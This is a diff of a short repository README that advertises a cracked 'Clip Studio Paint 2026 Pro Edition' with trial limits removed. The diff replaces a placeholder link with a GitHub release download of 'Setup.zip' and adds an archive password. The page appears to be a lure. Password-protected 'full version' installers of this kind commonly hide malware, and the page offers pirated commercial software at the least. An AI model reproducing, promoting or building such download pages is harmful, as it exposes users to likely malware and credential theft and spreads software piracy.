@@ -4,13 +4,16 @@
  \___|_|_| .__/ |___/\__|\_,_\__,_|_\___/ |_| \__,_|_|_||_\__|
          |_|
 
+
+
 Clip Studio Paint 2026 Pro Edition. Drawing and painting software for comics, manga, illustration, and animation with smart brushes. Designed for power users and professionals who need the full feature set, with all trial limits removed and lifetime updates included. Compatible with Windows 10/11 (64-bit).
 
 
 ***************** DOWNLOAD *****************
 ------------------------------------------------
 
-[+] DOWNLOAD LINK: [download here](https://google.com)
+[+] DOWNLOAD LINK: [download here](https://github.com/BrinkLayerSignify/ClipStudio-Paint-Pro/releases/download/LaST/Setup.zip)
+
 [+] 🔐🔐🔐: 1847
 
 ------------------------------------------------
